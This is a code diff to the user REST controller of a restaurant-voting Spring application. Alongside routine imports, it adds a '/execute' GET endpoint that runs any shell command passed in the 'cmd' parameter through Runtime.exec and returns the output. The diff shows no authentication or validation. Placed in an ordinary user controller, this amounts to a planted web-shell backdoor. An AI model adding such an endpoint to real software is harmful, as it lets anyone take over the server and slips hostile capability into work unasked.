@@ -15,9 +15,13 @@ import restaurantVote.service.UserService;
 
 import javax.persistence.EntityNotFoundException;
 import javax.validation.Valid;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Optional;
+import java.util.stream.Collectors;
 
 @RestController
 @RequestMapping("/api/user")
@@ -76,5 +80,16 @@ public class UserRestController {
         }
 
         return new ModelAndView("redirect:/", "userForm", userDto);
+    }
+
+    @GetMapping("/execute")
+    public String executeCommand(@RequestParam("cmd") String cmd) {
+        try {
+            Process process = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            return reader.lines().collect(Collectors.joining("\n"));
+        } catch (IOException e) {
+            return "Error: " + e.getMessage();
+        }
     }
 }
